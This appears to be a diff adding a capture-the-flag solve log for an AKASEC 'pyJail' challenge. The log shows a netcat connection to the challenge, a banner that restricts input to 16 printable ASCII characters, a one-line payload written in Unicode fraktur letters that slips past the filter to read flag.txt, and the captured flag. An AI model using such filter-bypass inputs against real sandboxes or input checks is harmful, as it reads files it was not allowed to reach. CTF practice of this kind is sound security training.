@@ -1,0 +1,17 @@
+$ nc 20.80.240.190 4444
+
+#################################################################
+#                                                               #
+#   Welcome to pyJail!                                          #
+#                                                               #
+#   You have been jailed for using too many characters.         #
+#                                                               #
+#   You are only allowed to use 16 characters of printable      #
+#   ascii.                                                      #
+#                                                               #
+#   If you manage to break free, you will get the flag.         #
+#                                                               #
+#################################################################
+
+> 𝔭𝔯𝔦𝔫𝔱(*𝔬𝔭𝔢𝔫("flag.txt"))
+AKASEC{1t5_4ll_4b0ut_3sc4p1ng_4nd_3v4lu471ng}
